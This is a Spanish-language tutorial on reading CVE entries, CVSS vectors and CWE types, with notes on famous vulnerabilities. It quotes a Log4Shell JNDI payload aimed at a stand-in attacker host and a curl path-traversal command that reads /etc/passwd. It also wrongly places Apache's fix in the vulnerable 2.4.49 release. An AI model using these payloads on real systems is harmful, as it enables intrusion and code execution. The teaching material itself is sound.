# Cómo Leer un CVE — Guía Completa

> Entender el sistema de identificación de vulnerabilidades es fundamental para cualquier auditor de seguridad. Esta guía cubre desde el formato CVE hasta cómo interpretar una puntuación CVSS.

---

## Tabla de contenidos

1. [¿Qué es un CVE?](#1-qué-es-un-cve)
2. [Anatomía de un CVE](#2-anatomía-de-un-cve)
3. [CVSS — Sistema de puntuación](#3-cvss--sistema-de-puntuación)
4. [CWE — Tipos de debilidades](#4-cwe--tipos-de-debilidades)
5. [Bases de datos de vulnerabilidades](#5-bases-de-datos-de-vulnerabilidades)
6. [CVEs históricos que debes conocer](#6-cves-históricos-que-debes-conocer)
7. [Cómo buscar CVEs de forma efectiva](#7-cómo-buscar-cves-de-forma-efectiva)
8. [Cheat Sheet](#8-cheat-sheet)

---

## 1. ¿Qué es un CVE?

**CVE** son las siglas de *Common Vulnerabilities and Exposures*. Es un sistema de identificadores únicos para vulnerabilidades de seguridad públicamente conocidas.

- **Creado por:** MITRE Corporation en 1999
- **Financiado por:** CISA (Cybersecurity and Infrastructure Security Agency, EE.UU.)
- **Objetivo:** dar un nombre estándar a cada vulnerabilidad para que todo el mundo hable de lo mismo

### Formato del identificador

```
CVE - YYYY - NNNNN
 │     │       │
 │     │       └── Número secuencial (mínimo 4 dígitos, puede ser mayor)
 │     └─────────── Año de publicación o reserva
 └───────────────── Prefijo fijo
```

**Ejemplos:**
```
CVE-2017-0144    → EternalBlue (SMB)
CVE-2021-44228   → Log4Shell (Log4j)
CVE-2014-0160    → Heartbleed (OpenSSL)
CVE-2021-41773   → Apache Path Traversal
```

### Estados de un CVE

| Estado | Significado |
|--------|-------------|
| **Reserved** | El ID está reservado pero no publicado aún |
| **Published** | Publicado con información completa |
| **Rejected** | Descartado (duplicado, error, no es una vulnerabilidad real) |
| **Disputed** | Hay desacuerdo sobre si es realmente una vulnerabilidad |

### ¿Quién asigna los CVEs?

Las **CNA** (CVE Numbering Authorities) son organizaciones autorizadas por MITRE para asignar CVEs. Hay más de 200 CNAs en el mundo, incluyendo Microsoft, Google, Red Hat, y fabricantes de hardware.

---

## 2. Anatomía de un CVE

Cuando abres una ficha CVE en la NVD (nvd.nist.gov), encuentras los siguientes campos:

### Ejemplo real: CVE-2021-41773

```
┌─────────────────────────────────────────────────────────────┐
│ CVE-2021-41773                                              │
│ Published:  2021-10-05                                      │
│ Modified:   2022-03-15                                      │
│ Status:     Analyzed                                        │
├─────────────────────────────────────────────────────────────┤
│ DESCRIPCIÓN                                                 │
│ A flaw was found in a change made to path normalization     │
│ in Apache HTTP Server 2.4.49. An attacker could use a      │
│ path traversal attack to map URLs to files outside the      │
│ directories configured by Alias-like directives.            │
├─────────────────────────────────────────────────────────────┤
│ CVSS v3.1: 7.5 HIGH                                        │
│ Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N              │
├─────────────────────────────────────────────────────────────┤
│ CWE: CWE-22 (Path Traversal)                               │
├─────────────────────────────────────────────────────────────┤
│ Productos afectados (CPE):                                  │
│ apache:http_server:2.4.49                                   │
├─────────────────────────────────────────────────────────────┤
│ Referencias:                                                │
│ - https://httpd.apache.org/security/vulnerabilities_24.html │
│ - https://www.exploit-db.com/exploits/50383                 │
└─────────────────────────────────────────────────────────────┘
```

### Campos importantes

| Campo | Descripción |
|-------|-------------|
| **CVE ID** | Identificador único |
| **Descripción** | Explicación técnica de la vulnerabilidad |
| **CVSS Score** | Puntuación de severidad (0.0 a 10.0) |
| **Vector CVSS** | Cadena que resume las características del fallo |
| **CWE** | Tipo de debilidad (ej: Buffer Overflow, Path Traversal) |
| **CPE** | Productos afectados en formato estandarizado |
| **Referencias** | Links a parches, PoCs, writeups, advisories |

---

## 3. CVSS — Sistema de puntuación

El **CVSS** (*Common Vulnerability Scoring System*) es el estándar para medir la severidad de una vulnerabilidad con una puntuación del 0 al 10.

**Versión actual:** CVSS v3.1 (la más usada). Existe la v4.0 desde 2023 pero aún no está generalizada.

### Escala de severidad CVSS v3.1

| Puntuación | Nivel | Color |
|------------|-------|-------|
| 0.0 | None | ⚪ |
| 0.1 – 3.9 | Low | 🟢 |
| 4.0 – 6.9 | Medium | 🟡 |
| 7.0 – 8.9 | High | 🟠 |
| 9.0 – 10.0 | Critical | 🔴 |

### Las 8 métricas base del CVSS v3.1

Las métricas base son las que definen la puntuación principal. Se dividen en dos grupos:

#### Grupo de Explotabilidad

**1. Attack Vector (AV) — Vector de Ataque**
Cómo de cerca tiene que estar el atacante del objetivo.

| Valor | Código | Puntuación | Descripción |
|-------|--------|------------|-------------|
| Network | N | 0.85 | Explotable desde internet, sin acceso físico |
| Adjacent | A | 0.62 | Requiere acceso a la red local (LAN, WiFi) |
| Local | L | 0.55 | Requiere acceso local (SSH, consola) |
| Physical | P | 0.20 | Requiere acceso físico al dispositivo |

**2. Attack Complexity (AC) — Complejidad del Ataque**
Qué condiciones adicionales necesita el atacante.

| Valor | Código | Puntuación | Descripción |
|-------|--------|------------|-------------|
| Low | L | 0.77 | No se necesitan condiciones especiales |
| High | H | 0.44 | Se necesitan condiciones específicas (timing, datos concretos) |

**3. Privileges Required (PR) — Privilegios requeridos**
Qué nivel de acceso previo necesita el atacante.

| Valor | Código | Puntuación | Descripción |
|-------|--------|------------|-------------|
| None | N | 0.85 | No necesita ningún privilegio previo |
| Low | L | 0.62 | Necesita cuenta de usuario normal |
| High | H | 0.27 | Necesita privilegios de admin |

**4. User Interaction (UI) — Interacción del usuario**
¿Necesita que la víctima haga algo?

| Valor | Código | Puntuación | Descripción |
|-------|--------|------------|-------------|
| None | N | 0.85 | No requiere acción del usuario |
| Required | R | 0.62 | Requiere que el usuario realice una acción (clic, apertura de archivo) |

#### Grupo de Impacto

**5. Scope (S) — Alcance**
¿El fallo afecta solo al componente vulnerable o puede saltar a otros?

| Valor | Código | Descripción |
|-------|--------|-------------|
| Unchanged | U | El impacto está contenido en el componente afectado |
| Changed | C | El atacante puede comprometer otros componentes (sandbox escape, container escape) |

**6. Confidentiality Impact (C)**

| Valor | Código | Descripción |
|-------|--------|-------------|
| None | N | Sin impacto en confidencialidad |
| Low | L | Acceso limitado a información |
| High | H | Acceso total a toda la información del componente |

**7. Integrity Impact (I)**

| Valor | Código | Descripción |
|-------|--------|-------------|
| None | N | Sin impacto en integridad |
| Low | L | Modificación limitada de datos |
| High | H | Pérdida total de integridad |

**8. Availability Impact (A)**

| Valor | Código | Descripción |
|-------|--------|-------------|
| None | N | Sin impacto en disponibilidad |
| Low | L | Degradación del rendimiento |
| High | H | El servicio queda completamente inaccesible |

---

### Cómo leer un Vector String CVSS

El vector es una cadena que resume todas las métricas en formato compacto.

**Ejemplo:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

```
CVSS:3.1  → Versión del estándar
AV:N      → Attack Vector: Network (desde internet)
AC:L      → Attack Complexity: Low (fácil de explotar)
PR:N      → Privileges Required: None (no necesita cuenta)
UI:N      → User Interaction: None (no requiere acción del usuario)
S:U       → Scope: Unchanged (no escapa al componente)
C:H       → Confidentiality: High (roba toda la info)
I:N       → Integrity: None (no modifica datos)
A:N       → Availability: None (no tumba el servicio)
```

**Conclusión de este vector:** es explotable desde internet, sin credenciales, sin intervención del usuario, y expone toda la información del sistema. Puntuación: **7.5 HIGH**.

---

### Ejemplo perfecto de 10.0 CRITICAL

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

- Desde internet ✓
- Sin complejidad ✓
- Sin credenciales ✓
- Sin interacción del usuario ✓
- Scope cambiado (puede comprometer otros sistemas) ✓
- Confidencialidad, Integridad y Disponibilidad: todas HIGH ✓

Este es el vector de **Log4Shell** (CVE-2021-44228). La más alta puntuación posible.

---

## 4. CWE — Tipos de debilidades

El **CWE** (*Common Weakness Enumeration*) es un catálogo de tipos de fallos de software. A diferencia del CVE (que identifica una vulnerabilidad concreta), el CWE clasifica el *tipo* de fallo.

**Analogía:** El CVE es el nombre del criminal, el CWE es el tipo de delito.

### CWEs más frecuentes

| CWE | Nombre | Descripción |
|-----|--------|-------------|
| CWE-79 | Cross-Site Scripting (XSS) | Inyección de scripts en páginas web |
| CWE-89 | SQL Injection | Inyección de código SQL |
| CWE-22 | Path Traversal | Acceso a rutas no autorizadas (../../../etc/passwd) |
| CWE-78 | OS Command Injection | Ejecución de comandos del sistema |
| CWE-119 | Buffer Overflow | Desbordamiento de buffer en memoria |
| CWE-20 | Improper Input Validation | Falta de validación de entradas |
| CWE-287 | Improper Authentication | Autenticación incorrecta |
| CWE-200 | Information Exposure | Exposición de información sensible |
| CWE-352 | CSRF | Cross-Site Request Forgery |
| CWE-502 | Deserialization | Deserialización de datos no confiables |

---

## 5. Bases de datos de vulnerabilidades

### NVD — National Vulnerability Database

**URL:** https://nvd.nist.gov

La base de datos más completa y oficial. Gestionada por el NIST (National Institute of Standards and Technology). Características:

- Todas las CVEs publicadas con CVSS calculado
- Búsqueda por nombre de software, CPE, rango de fechas, severidad
- API pública gratuita: `https://services.nvd.nist.gov/rest/json/cves/2.0`
- Actualización diaria

**Búsqueda rápida:**
```
https://nvd.nist.gov/vuln/search?query=apache+2.4.49&search_type=all
```

---

### Exploit-DB

**URL:** https://www.exploit-db.com

Base de datos de exploits públicos. Mantenida por Offensive Security (los creadores de Kali Linux). Características:

- Exploits listos para usar (Proof of Concept)
- Verificados y categorizados
- Integrado en `searchsploit` (Kali Linux)

```bash
# Buscar exploits localmente en Kali
searchsploit "apache 2.4.49"
searchsploit -x exploits/linux/webapps/50383.py   # Ver exploit
searchsploit -m exploits/linux/webapps/50383.py   # Copiar al directorio actual
```

---

### MITRE ATT&CK

**URL:** https://attack.mitre.org

No es una base de CVEs, sino una matriz de **tácticas y técnicas** que usan los atacantes reales. Cada técnica está documentada con:
- Descripción
- Grupos de amenazas que la usan (APTs)
- Cómo detectarla
- Cómo mitigarla

---

### CISA KEV — Known Exploited Vulnerabilities

**URL:** https://www.cisa.gov/known-exploited-vulnerabilities-catalog

Las vulnerabilidades que están siendo **explotadas activamente en el mundo real**. Si tu sistema tiene una CVE de esta lista, es prioritario parchearla.

---

## 6. CVEs históricos que debes conocer

### CVE-2017-0144 — EternalBlue (MS17-010)

```
Producto:  Windows SMBv1 (puerto 445)
CVSS:      9.3 CRITICAL
Vector:    AV:N/AC:M/Au:N/C:C/I:C/A:C
Año:       2017
```

**¿Qué hace?** Ejecución remota de código sin autenticación explotando una vulnerabilidad en el protocolo SMBv1 de Windows. Fue desarrollado por la NSA (como "EternalBlue"), filtrado por Shadow Brokers y utilizado en los ataques de ransomware WannaCry y NotPetya.

**Impacto real:** Infectó más de 200.000 sistemas en 150 países en 24 horas.

---

### CVE-2021-44228 — Log4Shell

```
Producto:  Apache Log4j 2.0-beta9 a 2.14.1
CVSS:      10.0 CRITICAL
Vector:    AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Año:       2021
```

**¿Qué hace?** La librería de logging Log4j de Java evaluaba expresiones JNDI en los mensajes que registraba. Un atacante podía enviar `${jndi:ldap://attacker.com/exploit}` en cualquier campo de texto (User-Agent, login, etc.) y el servidor descargaba y ejecutaba código arbitrario.

**Impacto real:** Afectó a prácticamente toda la industria (Apple, Tesla, Amazon, Microsoft...). Se considera una de las peores vulnerabilidades de la historia.

---

### CVE-2014-0160 — Heartbleed

```
Producto:  OpenSSL 1.0.1 a 1.0.1f
CVSS:      7.5 HIGH
Vector:    AV:N/AC:L/Au:N/C:P/I:N/A:N
Año:       2014
```

**¿Qué hace?** Un fallo en la extensión Heartbeat de TLS permitía a un atacante leer 64KB de memoria del servidor por petición, potencialmente extrayendo claves privadas SSL, contraseñas y sesiones de usuarios.

**Impacto real:** El 17% de todos los servidores HTTPS del mundo eran vulnerables en el momento de la divulgación.

---

### CVE-2021-41773 — Apache Path Traversal & RCE

```
Producto:  Apache HTTP Server 2.4.49
CVSS:      7.5 HIGH (escalado a 9.8 con módulo CGI activo)
Vector:    AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Año:       2021
```

**¿Qué hace?** Una normalización de rutas incorrecta permitía traversal de directorios fuera de la raíz del servidor. Con el módulo `mod_cgi` activo, escalaba a ejecución remota de código.

```bash
# PoC del path traversal
curl "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

**Impacto real:** Apache lanzó el parche con 2.4.49, pero la vulnerabilidad fue explotada masivamente en las 24h siguientes a la divulgación.

---

## 7. Cómo buscar CVEs de forma efectiva

### Estrategia 1: Por nombre + versión en NVD

```
Búsqueda: "apache httpd 2.4.49"
Filtros:  CVSS >= 7.0, ordenar por puntuación
URL: https://nvd.nist.gov/vuln/search?query=apache+2.4.49
```

### Estrategia 2: Con el script vuln_checker.py

```bash
# Buscar CVEs de Apache 2.4.49 con severidad HIGH o superior
python3 vuln_checker.py -k "apache httpd" -v "2.4.49" -s HIGH

# Buscar CVEs críticos de OpenSSH
python3 vuln_checker.py -k "openssh" -s CRITICAL -n 5 --report
```

### Estrategia 3: Con searchsploit (Exploit-DB local)

```bash
# Buscar exploits disponibles para el servicio identificado
searchsploit "ssh openssh 7.2"

# Buscar en título únicamente (más preciso)
searchsploit -t "apache 2.4.49"

# Ver el código del exploit
searchsploit -x linux/webapps/50383.py
```

### Estrategia 4: Con Nmap NSE scripts

```bash
# Detectar vulnerabilidades directamente con Nmap
nmap --script=vuln -p 80,443 192.168.1.41

# Script específico para una CVE
nmap --script=http-vuln-cve2021-41773 -p 80 192.168.1.41
nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.41
```

---

## 8. Cheat Sheet

```
══════════════════════════════════════════════════════════════
             CVE / CVSS CHEAT SHEET
══════════════════════════════════════════════════════════════

SEVERIDAD CVSS v3.1
  0.0          → None
  0.1 – 3.9    → Low
  4.0 – 6.9    → Medium
  7.0 – 8.9    → High
  9.0 – 10.0   → Critical

VECTOR STRING — VALORES CLAVE
  AV:N  → Explotable desde red (internet)    AV:L → Solo local
  AC:L  → Fácil de explotar                  AC:H → Condiciones especiales
  PR:N  → Sin credenciales                   PR:H → Necesita admin
  UI:N  → Sin interacción usuario            UI:R → Necesita clic/acción
  S:C   → Puede afectar otros sistemas       S:U  → Contenido en el componente
  C/I/A:H → Impacto total en CIA

BASES DE DATOS
  nvd.nist.gov         → CVEs oficiales con CVSS
  exploit-db.com       → Exploits públicos
  cve.mitre.org        → Registro original
  cisa.gov/kev         → Explotados activamente
  attack.mitre.org     → Técnicas de ataque (ATT&CK)

HERRAMIENTAS
  searchsploit "software version"   → Buscar exploits locales
  nmap --script=vuln IP             → Detección automática
  python3 vuln_checker.py -k "sw"  → Consulta a NVD API

CWEs FRECUENTES
  CWE-79   → XSS           CWE-89  → SQLi
  CWE-22   → Path Traversal  CWE-78  → Command Injection
  CWE-119  → Buffer Overflow  CWE-287 → Broken Auth

══════════════════════════════════════════════════════════════
```

---

## Referencias

- [NVD — National Vulnerability Database](https://nvd.nist.gov)
- [FIRST.org — Calculadora CVSS](https://www.first.org/cvss/calculator/3.1)
- [MITRE CVE](https://cve.mitre.org)
- [CWE List](https://cwe.mitre.org/data/index.html)
- [CISA Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
